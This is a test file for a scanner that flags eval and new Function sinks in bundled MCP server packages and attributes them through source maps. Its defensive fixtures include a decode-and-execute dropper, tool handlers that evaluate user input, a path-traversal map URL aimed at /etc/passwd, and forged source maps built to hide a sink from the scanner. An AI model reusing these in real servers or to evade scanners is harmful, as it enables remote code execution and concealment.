import { test } from 'node:test';
import assert from 'node:assert/strict';
import { mkdtempSync, mkdirSync, writeFileSync, rmSync, existsSync, readFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { createRequire } from 'node:module';
import { gzipSync } from 'node:zlib';
import { scanSurface } from '../src/engine.js';
import { surfaceFromArchiveFile } from '../src/acquire/packageSource.js';
import { surfaceFromPackageDir } from '../src/acquire/source.js';
import {
  dependencyOfSource,
  parseSourceMap,
  resolvePositions,
  sourceInfoOf,
  sourceMappingUrlOf,
  sourceMapPathsFor,
} from '../src/util/sourceMap.js';
import { matchVendoredSignature, type SignatureFile } from '../src/data/vendoredSignatures.js';
import { fileCtxOf } from '../src/util/fileCtx.js';
import type { ServerSurface, SourceFile } from '../src/types.js';

// Time bound for a hostile file. Generous on purpose: CI runners are slower than a
// laptop, and the failures this guards against took tens of seconds to minutes.
const HOSTILE_MS = 6000;

// APL-0012 (mcprush, @scorezilla/mcp@0.4.2): MTC-SRC-001 on Ajv's schema compiler,
// which tsup bundles into dist/index.js together with @modelcontextprotocol/sdk —
// and the attacks on that fix (forged maps, look-alike calls, DoS).

// --- helpers -----------------------------------------------------------------

const B64 = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/';
function vlq(n: number): string {
  let v = n < 0 ? (-n << 1) | 1 : n << 1;
  let out = '';
  do {
    let d = v & 31;
    v >>>= 5;
    if (v) d |= 32;
    out += B64[d];
  } while (v);
  return out;
}
/** `mappings` from absolute segments: per generated line, [genCol] or [genCol, src, origLine0, origCol]. */
function encode(lines: number[][][]): string {
  let src = 0;
  let ol = 0;
  let oc = 0;
  return lines
    .map((segs) => {
      let gc = 0;
      return segs
        .map((s) => {
          const parts = [vlq(s[0]! - gc)];
          gc = s[0]!;
          if (s.length > 1) {
            parts.push(vlq(s[1]! - src), vlq(s[2]! - ol), vlq(s[3]! - oc));
            src = s[1]!;
            ol = s[2]!;
            oc = s[3]!;
          }
          return parts.join('');
        })
        .join(',');
    })
    .join(';');
}

interface Piece {
  code: string;
  source: string;
  /** 1-based line in the original source where the piece starts. */
  line: number;
}

const SINK = /new\s+Function\s*\(|(?<![.$\w])eval\s*\(|\$Function\s*\(/g;

/**
 * A bundle of pieces and the map a real bundler would write for it: a segment at
 * the start of every line of every piece, and one exactly at every sink. With
 * `content`, the map embeds each source's text (`sourcesContent`) laid out so the
 * mapped lines and columns are right; a record overrides a source's text.
 */
function bundle(pieces: Piece[], opts: { oneLine?: boolean; content?: boolean | Record<string, string> } = {}): { code: string; map: string } {
  const sources = [...new Set(pieces.map((p) => p.source))];
  const lines: number[][][] = [[]];
  const text: Record<string, string[]> = {};
  let code = '';
  let col = 0;
  pieces.forEach((p, n) => {
    if (n && !opts.oneLine) {
      code += '\n';
      lines.push([]);
      col = 0;
    }
    const src = sources.indexOf(p.source);
    p.code.split('\n').forEach((l, k) => {
      if (k) {
        code += '\n';
        lines.push([]);
        col = 0;
      }
      const row = lines[lines.length - 1]!;
      row.push([col, src, p.line - 1 + k, 0]);
      for (const m of l.matchAll(SINK)) row.push([col + m.index!, src, p.line - 1 + k, m.index!]);
      (text[p.source] ??= [])[p.line - 1 + k] = l;
      code += l;
      col += l.length;
    });
  });
  const map: Record<string, unknown> = { version: 3, sources, names: [], mappings: encode(lines) };
  if (opts.content) {
    map.sourcesContent = sources.map((s) =>
      typeof opts.content === 'object' && opts.content[s] !== undefined ? opts.content[s] : Array.from(text[s] ?? [], (l) => l ?? '').join('\n'),
    );
  }
  return { code, map: JSON.stringify(map) };
}

function surfaceOf(files: SourceFile[], maps: SourceFile[] = [], name?: string): ServerSurface {
  return {
    id: 'pkg',
    source: { kind: 'package', origin: 'pkg' },
    server: {},
    tools: [],
    prompts: [],
    resources: [],
    sourceFiles: files,
    ...(maps.length ? { sourceMaps: maps } : {}),
    ...(name ? { packageMeta: { registry: 'npm', name } } : {}),
  } as unknown as ServerSurface;
}

/** Scan a bundled dist/index.js, with its sidecar map when one is given. */
async function scanBundle(code: string, map?: string, name?: string, path = 'dist/index.js') {
  const content = map ? `${code}\n//# sourceMappingURL=index.js.map\n` : `${code}\n`;
  return scanSurface(surfaceOf([{ path, content }], map ? [{ path: `${path}.map`, content: map }] : [], name));
}
const by = (r: any, rule: string): any[] => r.findings.filter((f: any) => f.ruleId === rule);
const dyn = (r: any): any[] => by(r, 'MTC-SRC-001').concat(by(r, 'MTC-SRC-010'));
/** The server's own dynamic code is still reported at full weight. */
const ownHigh = (r: any): boolean => dyn(r).some((x: any) => x.severity === 'high');
const sigFile = (src: string): SignatureFile => {
  const ctx = fileCtxOf({ path: 'x.js', content: src });
  const fn = (i: number) => ctx.enclosingFn(i);
  return {
    src,
    mask: ctx.mask,
    paramsAt: (i) => (fn(i)?.params ?? []).map((p) => p.name),
    fnAt: (i) => (fn(i) ? { start: fn(i)!.bodyStart, end: fn(i)!.bodyEnd } : null),
    memo: new Map(),
  };
};
/**
 * A bundle around `code`, as esbuild writes one: a CommonJS module wrapper and the
 * rest of the dependencies' text (here only their identifying strings) — what a
 * signature needs to be believed without a map.
 */
const BUNDLE = (code: string): string =>
  'var __commonJS = (cb, mod) => function __require() { return mod; };\nvar require_x = __commonJS({});\n' +
  'var __ids = ["schema with key or id ", "strict mode: ", "argument fn must be a function", ' +
  '"argument namespace is required", "intrinsic name must be a non-empty string", "%AsyncFunction%"];\n' +
  `${AJV_CODEGEN}\n${code}`;

// Ajv's CodeGen and ValueScope as the minified bundle carries them (their scopeRefs/toString, verbatim).
const AJV_CODEGEN =
  'class wo{constructor(e,t={}){this._values={};this._extScope=e;this.opts=t}scopeRefs(t,n=this._values){return this._reduceValues(n,i=>i)}}' +
  'class Gn{constructor(e,t={}){this._extScope=e;this._values={};this.opts=t}toString(){return this._root.render(this.opts)}scopeRefs(t){return this._extScope.scopeRefs(t,this._values)}}var Ut={CodeGen:Gn};';
// Ajv's compileSchema as @scorezilla/mcp@0.4.2's minified dist/index.js carries it (shortened), with its CodeGen.
const AJV_MIN =
  AJV_CODEGEN +
  'function Ys(e){let{es5:i,lines:r,ownProperties:o}=this.opts,a=new Ut.CodeGen(this.scope,{es5:i,lines:r,ownProperties:o}),u={gen:a,self:this},l;' +
  'try{this._compilations.add(e),(0,XD.validateFunctionCode)(u),a.optimize(this.opts.code.optimize);let d=a.toString();' +
  'l=`${a.scopeRefs(xn.default.scope)}return ${d}`,this.opts.code.process&&(l=this.opts.code.process(l,e));' +
  'let p=new Function(`${xn.default.self}`,`${xn.default.scope}`,l)(this,this.scope.get());this.scope.value(c,{ref:p})}finally{}}';
// Ajv 8.20.0 dist/compile/index.js (compileSchema), as an unminified bundle inlines it.
const AJV_CJS = [
  'function compileSchema(sch) {',
  '    const gen = new codegen_1.CodeGen(this.scope, { es5, lines, ownProperties });',
  '    let sourceCode;',
  '    try {',
  '        this._compilations.add(sch);',
  '        gen.optimize(this.opts.code.optimize);',
  '        // gen.optimize(1)',
  '        const validateCode = gen.toString();',
  '        sourceCode = `${gen.scopeRefs(names_1.default.scope)}return ${validateCode}`;',
  '        // console.log((codeSize += sourceCode.length), (nodeCount += gen.nodeCount))',
  '        if (this.opts.code.process)',
  '            sourceCode = this.opts.code.process(sourceCode, sch);',
  '        // console.log("\\n\\n\\n *** \\n", sourceCode)',
  '        const makeValidate = new Function(`${names_1.default.self}`, `${names_1.default.scope}`, sourceCode);',
  '        const validate = makeValidate(this, this.scope.get());',
  '        this.scope.value(validateName, { ref: validate });',
  '    } finally {}',
  '}',
].join('\n');
// Ajv 8.20.0 dist/compile/jtd/serialize.js (compileSerializer).
const AJV_JTD = [
  'function compileSerializer(sch, definitions) {',
  '    const gen = new codegen_1.CodeGen(this.scope, { es5, lines, ownProperties });',
  '    let sourceCode;',
  '    try {',
  '        const serializeFuncCode = gen.toString();',
  '        sourceCode = `${gen.scopeRefs(names_1.default.scope)}return ${serializeFuncCode}`;',
  '        const makeSerialize = new Function(`${names_1.default.scope}`, sourceCode);',
  '        const serialize = makeSerialize(this.scope.get());',
  '    } finally {}',
  '}',
].join('\n');
const OWN = 'export async function runTool(input){ return new Function(input.code)(); }';
const AJV_SRC = '../node_modules/.pnpm/ajv@8.20.0/node_modules/ajv/lib/compile/index.ts';

// --- source maps ---------------------------------------------------------------

test('source map: each position takes the segment with the greatest generated column ≤ it', () => {
  const map = parseSourceMap(JSON.stringify({ version: 3, sources: ['a.ts', 'b.ts'], names: [], mappings: encode([[[0, 0, 9, 0], [10, 1, 19, 4]], [], [[3]], [[5, 0, 1, 2]]]) }))!;
  const r = resolvePositions(map, [
    { line: 0, column: 12 },
    { line: 0, column: 9 },
    { line: 0, column: 0 },
    { line: 1, column: 0 }, // an empty generated line
    { line: 2, column: 7 }, // a segment with no source
    { line: 3, column: 4 }, // before the line's first segment
    { line: 3, column: 50 },
    { line: 9, column: 0 }, // past the end of mappings
  ]);
  assert.deepEqual(r.map((p) => (p ? `${p.source}:${p.line}:${p.column}@${p.generatedColumn}` : null)), ['b.ts:20:4@10', 'a.ts:10:0@0', 'a.ts:10:0@0', null, null, null, 'a.ts:2:2@5', null]);
});

test('source map: a map that does not fit the file resolves nothing', () => {
  const map = parseSourceMap(JSON.stringify({ version: 3, sources: ['node_modules/x/y.js'], mappings: encode([[[0, 0, 0, 0], [40, 0, 0, 5]]]) }))!;
  const fits = { lineCount: 1, lineLength: () => 60 };
  const short = { lineCount: 1, lineLength: () => 20 }; // a segment at column 40 of a 20-char line
  assert.ok(resolvePositions(map, [{ line: 0, column: 45 }], fits)[0]);
  assert.equal(resolvePositions(map, [{ line: 0, column: 45 }], short)[0], null);
  const tall = parseSourceMap(JSON.stringify({ version: 3, sources: ['a'], mappings: 'AAAA;AACA;AACA' }))!;
  assert.equal(resolvePositions(tall, [{ line: 0, column: 0 }], { lineCount: 2, lineLength: () => 10 })[0], null);
});

test('source map: sourceRoot and .. are resolved before deciding; sections; malformed and deep JSON are refused', () => {
  const rooted = parseSourceMap(JSON.stringify({ version: 3, sourceRoot: 'webpack://x/', sources: ['./node_modules/ajv/x.js'], mappings: 'AAAA' }))!;
  assert.equal(resolvePositions(rooted, [{ line: 0, column: 3 }])[0]!.source, 'node_modules/ajv/x.js');
  const climbs = parseSourceMap(JSON.stringify({ version: 3, sourceRoot: 'node_modules/ajv/', sources: ['../../src/tools/run.ts'], mappings: 'AAAA' }))!;
  assert.equal(sourceInfoOf(climbs, 0).path, 'src/tools/run.ts');
  // A root over 1 KB makes the map unusable; a source path over 4 KB is unmappable.
  assert.equal(parseSourceMap(JSON.stringify({ version: 3, sourceRoot: 'a/'.repeat(600), sources: ['x'], mappings: 'AAAA' })), null);
  const long = parseSourceMap(JSON.stringify({ version: 3, sources: ['a/'.repeat(3000) + 'node_modules/ajv/x.js'], mappings: 'AAAA' }))!;
  assert.equal(resolvePositions(long, [{ line: 0, column: 0 }])[0], null);
  assert.equal(parseSourceMap(JSON.stringify({ version: 3, sources: Array(200_001).fill('x'), mappings: 'AAAA' })), null);
  const sections = parseSourceMap(
    JSON.stringify({
      version: 3,
      sections: [
        { offset: { line: 0, column: 0 }, map: { version: 3, sources: ['src/a.ts'], mappings: 'AAAA' } },
        { offset: { line: 2, column: 10 }, map: { version: 3, sources: ['node_modules/ajv/b.js'], mappings: 'AAKA' } },
      ],
    }),
  )!;
  const r = resolvePositions(sections, [{ line: 1, column: 0 }, { line: 2, column: 12 }]);
  assert.equal(r[0], null); // section 0 maps only its own line 0
  assert.equal(r[1]!.source, 'node_modules/ajv/b.js');
  assert.equal(r[1]!.line, 6);
  assert.equal(r[1]!.generatedColumn, 10);
  const bad = parseSourceMap(JSON.stringify({ version: 3, sources: ['a.ts'], mappings: 'AAAA,!!!' }))!;
  assert.deepEqual(resolvePositions(bad, [{ line: 0, column: 0 }]), [null]);
  assert.equal(parseSourceMap('not json'), null);
  assert.equal(parseSourceMap(JSON.stringify({ version: 3, mappings: 'AAAA' })), null);
  assert.equal(parseSourceMap('[' + '['.repeat(50) + ']'.repeat(50) + ']'), null);
  assert.equal(parseSourceMap('{"x":' + '['.repeat(50) + ']'.repeat(50) + '}'), null);
});

test('source map: sourceMappingURL is a directive only on its own line at the end of the file', () => {
  assert.equal(sourceMappingUrlOf('x();\n//# sourceMappingURL=index.js.map\n'), 'index.js.map');
  assert.equal(sourceMappingUrlOf('x();\n/*# sourceMappingURL=a.map */'), 'a.map');
  assert.equal(sourceMappingUrlOf('const re = "//# sourceMappingURL=x.map";\nmore();\n'), null);
  assert.equal(sourceMappingUrlOf('x = 1\n# //# sourceMappingURL=data:application/json;base64,e30=\n'), null);
  assert.deepEqual(sourceMapPathsFor('dist/index.js', 'x\n//# sourceMappingURL=../maps/index.js.map'), ['maps/index.js.map', 'dist/index.js.map']);
  assert.deepEqual(sourceMapPathsFor('index.js', 'x\n//# sourceMappingURL=../../etc/passwd'), ['index.js.map']);
  assert.deepEqual(sourceMapPathsFor('a.js', 'x\n//# sourceMappingURL=https://cdn.example/a.js.map'), ['a.js.map']);
  assert.deepEqual(sourceMapPathsFor('src/a.py', ''), []);
});

test('source map: the dependency is the package after the last node_modules/, with its store version', () => {
  assert.deepEqual(dependencyOfSource(AJV_SRC), { package: 'ajv', version: '8.20.0' });
  assert.deepEqual(dependencyOfSource('../node_modules/.pnpm/@scope+name@1.2.3_peer@4.0.0/node_modules/@scope/name/lib/x.ts'), { package: '@scope/name', version: '1.2.3' });
  assert.deepEqual(dependencyOfSource('../node_modules/.pnpm/ajv-formats@3.0.1(ajv@8.17.1)/node_modules/ajv-formats/dist/x.js'), { package: 'ajv-formats', version: '3.0.1' });
  assert.deepEqual(dependencyOfSource('../../.yarn/cache/ajv-npm-8.20.0-ee4dc5b2a8-cc6cd.zip/node_modules/ajv/dist/compile/index.js'), { package: 'ajv', version: '8.20.0' });
  assert.deepEqual(dependencyOfSource('../.yarn/cache/@scope-name-npm-1.2.3-beta.1-0123456789-abcdef.zip/node_modules/@scope/name/x.js'), { package: '@scope/name', version: '1.2.3-beta.1' });
  assert.deepEqual(dependencyOfSource('../node_modules/.bun/ajv@8.20.0/node_modules/ajv/dist/compile/index.js'), { package: 'ajv', version: '8.20.0' });
  assert.deepEqual(dependencyOfSource('node_modules/ajv/dist/compile/index.js'), { package: 'ajv' });
  assert.deepEqual(dependencyOfSource('webpack://srv/./node_modules/a/node_modules/b/index.js'), { package: 'b' });
  assert.deepEqual(dependencyOfSource('..\\node_modules\\zod\\lib\\x.js'), { package: 'zod' });
  // Normalized first: a path that climbs back out of node_modules is not a dependency.
  assert.equal(dependencyOfSource('../node_modules/ajv/../../src/tools/run.ts'), null);
  assert.equal(dependencyOfSource('../node_modules/.pnpm/ajv@8.20.0/node_modules/ajv/../../../../../src/tools/run.ts'), null);
  // A pnpm store of a local workspace package is the author's own code.
  assert.equal(dependencyOfSource('../node_modules/.pnpm/file+packages+core/node_modules/@acme/core/src/run.ts'), null);
  assert.equal(dependencyOfSource('../node_modules/.pnpm/@acme+core@link+packages+core/node_modules/@acme/core/src/run.ts'), null);
  assert.equal(dependencyOfSource('../src/tools/run.ts'), null);
  assert.equal(dependencyOfSource('../my_node_modules/x/y.js'), null);
  assert.equal(dependencyOfSource('node_modules/.vite/deps/chunk.js'), null);
});

// --- attribution through the source map -------------------------------------------

test('APL-0012: the scorezilla shape — Ajv mapped into node_modules is the dependency, info, capability-neutral', async () => {
  for (const content of [true, false]) {
    const { code, map } = bundle([{ code: 'import{x}from"y";', source: '../src/index.ts', line: 1 }, { code: AJV_MIN, source: AJV_SRC, line: 171 }], { oneLine: true, content });
    const r = await scanBundle(code, map);
    const f = by(r, 'MTC-SRC-001');
    assert.equal(f.length, 1);
    assert.equal(f[0].severity, 'info');
    assert.match(f[0].title, /in bundled dependency ajv@8\.20\.0 \(dist\/index\.js\)/);
    assert.deepEqual(f[0].data.vendored, { package: 'ajv', version: '8.20.0', via: 'source-map', source: `${AJV_SRC}:171` });
    assert.equal(f[0].data.capabilityTag, null);
    assert.equal(r.capabilityProfile.level, 'minimal');
    assert.ok(!f[0].description.includes('sizes the blast radius'));
  }
});

test('APL-0012: the server\'s own new Function(input) beside a vendored Ajv stays SRC-001 at full severity', async () => {
  const { code, map } = bundle([{ code: AJV_MIN, source: AJV_SRC, line: 171 }, { code: OWN, source: '../src/tools/run.ts', line: 12 }], { oneLine: true, content: true });
  const r = await scanBundle(code, map);
  const f = by(r, 'MTC-SRC-001');
  const own = f.filter((x: any) => !x.data.vendored);
  const dep = f.filter((x: any) => x.data.vendored);
  assert.equal(own.length, 1);
  assert.equal(own[0].severity, 'high');
  assert.match(own[0].evidence, /new Function\(input\.code\)/);
  assert.equal(dep.length, 1);
  assert.equal(dep[0].severity, 'info');
  assert.equal(by(r, 'MTC-SRC-010').filter((x: any) => x.severity === 'high').length, 1);
  assert.equal(r.capabilityProfile.level, 'high');
});

test('APL-0012: a map entry pointing at src/ stays the server\'s code', async () => {
  const { code, map } = bundle([{ code: OWN, source: '../src/tools/run.ts', line: 3 }], { content: true });
  const f = by(await scanBundle(code, map), 'MTC-SRC-001');
  assert.equal(f.length, 1);
  assert.equal(f[0].severity, 'high');
  assert.equal(f[0].data.vendored, undefined);
});

test('APL-0012: an Ajv-looking line the map places in src/ stays — the map wins over the signature', async () => {
  const { code, map } = bundle([{ code: AJV_MIN, source: '../src/validate.ts', line: 40 }], { oneLine: true, content: true });
  const r = await scanBundle(code, map);
  const f = by(r, 'MTC-SRC-001');
  assert.equal(f.length, 1);
  assert.equal(f[0].severity, 'high');
  assert.equal(f[0].data.vendored, undefined);
  assert.equal(r.capabilityProfile.level, 'high');
  // …and without the map, in a bundle, the same text IS Ajv's signature.
  assert.equal(by(await scanBundle(BUNDLE(AJV_MIN)), 'MTC-SRC-001')[0].severity, 'info');
});

test('APL-0012: the downgrade recomputes the capability level, and the fingerprint stays the same', async () => {
  const asDep = bundle([{ code: AJV_MIN, source: AJV_SRC, line: 171 }], { oneLine: true, content: true });
  const asOwn = bundle([{ code: AJV_MIN, source: '../src/x.ts', line: 171 }], { oneLine: true, content: true });
  const dep = await scanBundle(asDep.code, asDep.map);
  const own = await scanBundle(asOwn.code, asOwn.map);
  assert.equal(own.capabilityProfile.level, 'high');
  assert.equal(dep.capabilityProfile.level, 'minimal');
  const a = by(dep, 'MTC-SRC-001')[0];
  const b = by(own, 'MTC-SRC-001')[0];
  assert.equal(a.severity, 'info');
  assert.equal(b.severity, 'high');
  assert.equal(a.data.fingerprint, b.data.fingerprint);
});

test('source map: a statement segment that starts at the indentation (esbuild) still covers its sink', async () => {
  // safe-eval's `vm.runInNewContext(code, sandbox, opts)` as esbuild re-indents it.
  const line = '      vm.runInNewContext(code, sandbox, opts);';
  const original = 'function run(code, sandbox, opts) {\n  vm.runInNewContext(code, sandbox, opts);\n}';
  const map = (source: string, col = 0) => JSON.stringify({ version: 3, sources: [source], sourcesContent: [original], mappings: encode([[[col, 0, 1, 2]]]) });
  const code = `${line}\n`;
  assert.equal(by(await scanBundle(code, map('../node_modules/some-lib/index.js')), 'MTC-SRC-001')[0].data.vendored.package, 'some-lib');
  const lib = by(await scanBundle(code, map('../node_modules/safe-eval/index.js')), 'MTC-SRC-001')[0];
  assert.equal(lib.severity, 'high');
  assert.equal(lib.data.vendored.codeExecutionLibrary, true);
  // A segment that starts at code before the sink (not indentation) does not cover it.
  const pre = 'const x = 1; return vm.runInNewContext(code, sandbox, opts);';
  const preMap = JSON.stringify({ version: 3, sources: ['../node_modules/some-lib/index.js'], sourcesContent: [`${pre}`], mappings: encode([[[0, 0, 0, 0]]]) });
  assert.equal(by(await scanBundle(pre, preMap), 'MTC-SRC-001')[0].data.vendored, undefined);
});

test('round 2: only a vetted code generator is discounted — any other dependency is named and counts in full', async () => {
  const code = 'export const run = (body) => new Function(body)();';
  for (const content of [false, true]) {
    const other = bundle([{ code, source: '../node_modules/left-pad/index.js', line: 2 }], { content });
    const r = await scanBundle(other.code, other.map);
    assert.ok(ownHigh(r));
    const f = by(r, 'MTC-SRC-001')[0];
    assert.deepEqual(f.data.vendored, { package: 'left-pad', via: 'source-map', source: '../node_modules/left-pad/index.js:2', discounted: false });
    assert.match(f.title, /in bundled dependency left-pad, counted in full/);
    assert.match(f.description, /Only vetted code generators/);
    assert.equal(r.capabilityProfile.level, 'high');
    // Round 3: generators without a verified site signature are named and counted in full too.
    for (const pkg of ['zod', 'function-bind', 'fast-json-stringify', '@sinclair/typebox', 'protobufjs', '@protobufjs/codegen']) {
      const gen = bundle([{ code, source: `../node_modules/${pkg}/index.js`, line: 2 }], { content });
      const g = await scanBundle(gen.code, gen.map);
      assert.ok(ownHigh(g), pkg);
      assert.equal(by(g, 'MTC-SRC-001')[0].data.vendored.discounted, false, pkg);
    }
  }
});

test('round 2: a precise map that claims Ajv for a call that is not Ajv\'s is not believed, with or without sourcesContent', async () => {
  const code = 'export async function run({ code }) { return String(new Function(code)()); }';
  const at = code.indexOf('new Function');
  const map = JSON.stringify({ version: 3, sources: [AJV_SRC], mappings: encode([[[0, 0, 0, 0], [at, 0, 170, 0]]]) });
  const r = await scanBundle(code, map);
  assert.ok(ownHigh(r));
  assert.equal(r.capabilityProfile.level, 'high');
});

test('round 2: a map whose sourcesContent is a copy of the bundle, or that claims Ajv without Ajv\'s call, is not believed', async () => {
  // The bundle's own text as the "original" of an allowlisted package.
  const code = 'export async function run({ code }) { return String(new Function(code)()); }';
  const at = code.indexOf('new Function');
  const copied = (pkg: string) =>
    JSON.stringify({ version: 3, sources: [`../node_modules/${pkg}/index.js`], sourcesContent: [`${code}\n//# sourceMappingURL=index.js.map\n`], mappings: encode([[[0, 0, 0, 0], [at, 0, 0, at]]]) });
  assert.ok(ownHigh(await scanBundle(code, copied('fast-json-stringify'))));
  // Ajv claimed with an original that shows a plain `new Function(code)` — not Ajv's compile call.
  const ajv = JSON.stringify({ version: 3, sources: [AJV_SRC], sourcesContent: [code], mappings: encode([[[0, 0, 0, 0], [at, 0, 0, at]]]) });
  const r = await scanBundle(code, ajv);
  assert.ok(ownHigh(r));
  assert.equal(r.capabilityProfile.level, 'high');
});

test('round 2: npm aliases resolve by the store\'s real package, not the alias directory', async () => {
  // Round 3: a store of ANOTHER package says nothing — the directory's package, without a version (fail closed).
  assert.deepEqual(dependencyOfSource('../node_modules/.pnpm/vm2@3.9.19/node_modules/vm2-sandbox/lib/main.js'), { package: 'vm2-sandbox' });
  assert.deepEqual(dependencyOfSource('../node_modules/.pnpm/zod@3.23.8/node_modules/vm2/lib/nodevm.js'), { package: 'vm2' });
  assert.deepEqual(dependencyOfSource('../.yarn/cache/zod-npm-3.23.8-abcdef0123-0123456789.zip/node_modules/vm2/lib/nodevm.js'), { package: 'vm2' });
  assert.deepEqual(dependencyOfSource('../node_modules/.bun/fast-json-stringify@6.0.0/node_modules/vm2/lib/nodevm.js'), { package: 'vm2' });
  assert.deepEqual(dependencyOfSource('../node_modules/.pnpm/evil-pkg@1.0.0/node_modules/ajv/dist/x.js'), { package: 'ajv' });
  const code = 'export const run = (body) => new Function(body)();';
  for (const [source, library] of [
    ['../node_modules/.pnpm/zod@3.23.8/node_modules/vm2/lib/nodevm.js', true],
    ['../node_modules/.bun/fast-json-stringify@6.0.0/node_modules/vm2/lib/nodevm.js', true],
    ['../node_modules/.pnpm/vm2@3.9.19/node_modules/vm2-sandbox/lib/main.js', false],
    ['../node_modules/vm2-sandbox/lib/main.js', false], // a plain alias: an unlisted name, counted in full
    ['../node_modules/safer-eval/lib/index.js', false], // an unlisted evaluator
  ] as const) {
    const b = bundle([{ code, source, line: 2 }], { content: true });
    const r = await scanBundle(b.code, b.map);
    const f = by(r, 'MTC-SRC-001')[0];
    assert.equal(f.severity, 'high', source);
    assert.equal(f.data.vendored.discounted, false, source);
    assert.equal(!!f.data.vendored.codeExecutionLibrary, library, source);
    assert.equal(r.capabilityProfile.level, 'high', source);
  }
  // A store of another package under an ajv directory is ajv — and then only Ajv's own call is discounted.
  const evil = bundle([{ code, source: '../node_modules/.pnpm/evil-pkg@1.0.0/node_modules/ajv/dist/x.js', line: 2 }], { content: true });
  assert.ok(ownHigh(await scanBundle(evil.code, evil.map)));
});

test('review n=2: a bundled code-execution library is named but never discounted', async () => {
  for (const [pkg, content] of [['safe-eval', true], ['vm2', false], ['lodash.template', true]] as const) {
    const src = `../node_modules/${pkg}/index.js`;
    const { code, map } = bundle(
      [
        { code: 'module.exports=function(code,ctx){code="SAFE_EVAL="+code;return eval(code)};', source: src, line: 9 },
        { code: 'server.tool("calculate",{expression:z.string()},async({expression})=>safeEval(expression));', source: '../src/index.ts', line: 3 },
      ],
      { content },
    );
    const r = await scanBundle(code, map);
    const f = by(r, 'MTC-SRC-001')[0];
    assert.equal(f.severity, 'high', pkg);
    assert.equal(f.data.vendored.package, pkg);
    assert.equal(f.data.vendored.codeExecutionLibrary, true);
    assert.match(f.title, new RegExp(`in bundled code-execution library ${pkg.replace('.', '\\.')}`));
    assert.match(f.description, /a library whose job is to run code/);
    assert.equal(r.capabilityProfile.level, 'high', pkg);
  }
});

test('review n=3: forged and stale maps do not hide the server\'s own sink', async () => {
  const forged = (opts: { content?: string[]; at?: 'zero' | 'exact' } = {}) => {
    // Every line → Ajv; at column 0 (a coarse forgery) or exactly at the sink.
    const lines = OWN.split('\n').map((l) => [[0, 0, 170, 0], ...(opts.at === 'exact' ? [[l.indexOf('new Function'), 0, 170, 0]] : [])]);
    return JSON.stringify({ version: 3, sources: [AJV_SRC], mappings: encode(lines), ...(opts.content ? { sourcesContent: opts.content } : {}) });
  };
  const base = (await scanBundle(OWN)).score.score;
  // (a) a coarse forged map, as a sidecar, through ../maps, through sections, and implicit.
  assert.ok(ownHigh(await scanBundle(OWN, forged())));
  const viaUrl = await scanSurface(surfaceOf([{ path: 'dist/index.js', content: `${OWN}\n//# sourceMappingURL=../maps/x.map\n` }], [{ path: 'maps/x.map', content: forged() }]));
  assert.ok(ownHigh(viaUrl));
  const sections = JSON.stringify({ version: 3, sections: [{ offset: { line: 0, column: 0 }, map: JSON.parse(forged()) }] });
  assert.ok(ownHigh(await scanBundle(OWN, sections)));
  const implicit = await scanSurface(surfaceOf([{ path: 'dist/index.js', content: `${OWN}\n` }], [{ path: 'dist/index.js.map', content: forged() }]));
  assert.ok(ownHigh(implicit));
  // (b) sourcesContent that merely mentions "Function" somewhere near the line.
  const word = Array.from({ length: 171 }, () => '');
  word[170] = '// Function helpers';
  assert.ok(ownHigh(await scanBundle(OWN, forged({ at: 'exact', content: [word.join('\n')] }))));
  // (c) a decode-and-execute dropper is never attributed, even under an exact forged map.
  const dropper = 'export async function runTool(input){ return eval(atob(input.payload)); }';
  const dmap = JSON.stringify({ version: 3, sources: [AJV_SRC], mappings: encode([[[0, 0, 0, 0], [dropper.indexOf('eval'), 0, 0, dropper.indexOf('eval')]]]), sourcesContent: [dropper] });
  const dr = await scanBundle(dropper, dmap);
  assert.ok(ownHigh(dr));
  assert.equal(by(dr, 'MTC-SRC-004')[0].severity, 'high');
  assert.equal(dr.capabilityProfile.level, (await scanBundle(dropper)).capabilityProfile.level);
  // (d) a stale map: v1's map shipped with v2, where the server added its own sink.
  const v1 = bundle([{ code: 'import{x}from"y";', source: '../src/index.ts', line: 1 }, { code: AJV_MIN, source: AJV_SRC, line: 171 }], { oneLine: true });
  const v2 = `import{x}from"y";let run=i=>new Function(i.code)();${AJV_MIN}`;
  const stale = await scanBundle(v2, v1.map);
  assert.ok(ownHigh(stale));
  assert.equal(stale.capabilityProfile.level, 'high');
  // The forged maps change nothing on the threat axis either.
  assert.equal((await scanBundle(OWN, forged())).score.score, base);
});

test('review n=4: maps apply only to generated JavaScript — never to .py or .ts', async () => {
  const inline = (body: string, prefix: string): string =>
    `${body}\n${prefix}# sourceMappingURL=data:application/json;base64,${Buffer.from(JSON.stringify({ version: 3, sources: [AJV_SRC], mappings: 'AAAA;AACA;AACA;AACA;AACA;AACA;AACA' })).toString('base64')}\n`;
  const py = 'from mcp.server.fastmcp import FastMCP\nmcp = FastMCP("calc")\n@mcp.tool()\ndef calculate(expression: str) -> str:\n    return str(eval(expression))';
  assert.ok(ownHigh(await scanSurface(surfaceOf([{ path: 'server.py', content: inline(py, '# //') }]))));
  assert.ok(ownHigh(await scanSurface(surfaceOf([{ path: 'src/index.ts', content: inline(OWN, '//') }]))));
});

test('review n=7: own scope and local workspace stores are the server\'s code; a scoped dependency is not', async () => {
  const at = (source: string) => bundle([{ code: OWN, source, line: 2 }], { content: true });
  const vendoredOf = async (b: { code: string; map: string }, name?: string) => by(await scanBundle(b.code, b.map, name), 'MTC-SRC-001')[0].data.vendored;
  const ws = at('../node_modules/.pnpm/file+packages+core/node_modules/@acme/core/src/run.ts');
  assert.ok(ownHigh(await scanBundle(ws.code, ws.map, '@acme/mcp')));
  assert.equal(await vendoredOf(ws, '@acme/mcp'), undefined);
  const scope = at('../node_modules/@acme/core/dist/run.js');
  assert.ok(ownHigh(await scanBundle(scope.code, scope.map, '@acme/mcp')));
  assert.equal(await vendoredOf(scope, '@acme/mcp'), undefined); // the author's own workspace package
  assert.equal((await vendoredOf(scope, '@other/mcp')).package, '@acme/core'); // someone else's dependency (named)
  const climb = at('../node_modules/ajv/../../src/tools/run.ts');
  assert.ok(ownHigh(await scanBundle(climb.code, climb.map)));
  const self = at('../node_modules/@acme/server/dist/x.js');
  assert.ok(ownHigh(await scanBundle(self.code, self.map, '@acme/server')));
});

test('review n=8: yarn berry and bun store paths keep the version in the report', async () => {
